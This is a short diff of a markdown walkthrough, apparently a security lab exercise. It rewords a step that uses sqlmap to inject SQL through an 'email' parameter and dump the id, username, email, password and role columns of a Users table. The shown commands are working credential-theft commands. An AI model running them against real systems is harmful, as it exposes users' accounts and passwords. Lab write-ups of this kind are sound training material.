@@ -252,7 +252,7 @@ We don't know in advance the number of records in the table, and we can't estima
 sqlmap -r req.txt -p email --dbms=sqlite --batch --ignore-code=401 -T Users -C id,username,email,password,role --dump --start=1 --stop=10
 ```
 
-For now execute the following command:
+For this step, execute the following command, which retrieves the `id`, `username`, `email`, `password`, `role` columns from the `Users` table:
 
 ```bash
 sqlmap -r req.txt -p email --dbms=sqlite --batch --ignore-code=401 -T Users -C id,username,email,password,role --dump --start=1 --stop=10 --threads 4
